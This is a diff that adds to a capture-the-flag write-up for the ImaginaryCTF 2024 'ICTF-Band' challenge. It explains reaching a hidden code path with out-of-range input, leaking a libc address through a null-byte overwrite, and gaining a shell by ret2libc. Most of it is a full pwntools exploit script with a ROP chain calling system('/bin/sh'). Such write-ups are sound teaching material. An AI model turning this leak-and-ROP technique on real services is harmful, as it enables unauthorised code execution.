@@ -1710,7 +1710,113 @@ We can overflow that and overwrite the null byte therefore when it calls `puts(p
 
 How i know it's a libc leak is because i checked the stack when it's about to call `puts(ptr)` and the value after our input is a libc address
 
+But the catch is that there's a certain condition which only then would allow us access that portion
 
+You can check the [decompilation](https://github.com/7h30ry/writeups/blob/main/ImaginaryCTF24/Solve%20Scripts/ICTF-Band/name.c) to figure it but i'll show it here
+![image](https://github.com/user-attachments/assets/67f8a283-d271-45ae-8deb-0fabba016327)
+
+Basically the slot has to be greater than 5 or less than 0 then album count should not be greater than 0, if we do that then we will reach that vulnerable part of the function
+
+In my case i used slot value as `6` and album count as `0`
+
+And from there I leaked libc and ret2libc
+
+Here's my exploit [script]()
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+from warnings import filterwarnings
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF('ictf-band_patched')
+context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
+libc = exe.libc
+
+filterwarnings("ignore")
+context.log_level = 'info'
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+gdbscript = '''
+init-pwndbg
+breakrva 0x189F 
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+def init():
+    global io
+
+    io = start()
+
+
+def leak_libc():
+    io.sendlineafter(b">>", b"1")
+    io.sendlineafter(b"Slot [1-5]:", b"7")
+    io.sendlineafter(b"Album Count:", b"0")
+    io.sendlineafter(b"[y/n]:", b"y")
+    io.sendlineafter(b"Tell us how many you want, we will contact you soon:", b"17")
+    io.recvuntil("Tell us your e-mail:")
+    io.sendline(b'a'*16)
+    io.recvuntil(b"a"*16)
+    io.recvline()
+    libc.address = u64(b'\x00' + io.recvline().strip().ljust(7, b'\x00')) - 0x21b700
+
+    io.sendlineafter(b":", b"y")
+
+def solve():
+
+    leak_libc()
+
+    offset = 0x98
+    pop_rdi = libc.address + 0x000000000002a3e5
+    sh = next(libc.search(b'/bin/sh\x00'))
+    ret = libc.address + 0x0000000000029139
+    system = libc.sym['system']
+
+
+    info("libc base: %#x", libc.address)
+
+    payload = flat({
+        offset: [
+            pop_rdi,
+            sh,
+            ret,
+            system
+        ]
+    })
+
+    io.sendlineafter(b">>", b"1")
+    io.sendlineafter(b"Slot [1-5]:", b"7")
+    io.sendlineafter(b"Album Count:", b"0")
+    io.sendlineafter(b"[y/n]:", b"y")
+    io.sendlineafter(b"Tell us how many you want, we will contact you soon:", str(len(payload)+1).encode())
+    io.recvuntil("Tell us your e-mail:")
+    io.sendline(payload)
+    io.sendlineafter(b"It's verified [y/n]:", b"y")
+
+
+    io.interactive()
+
+def main():
+    
+    init()
+    solve()
+
+if __name__ == '__main__':
+    main()
+```
 
 
 
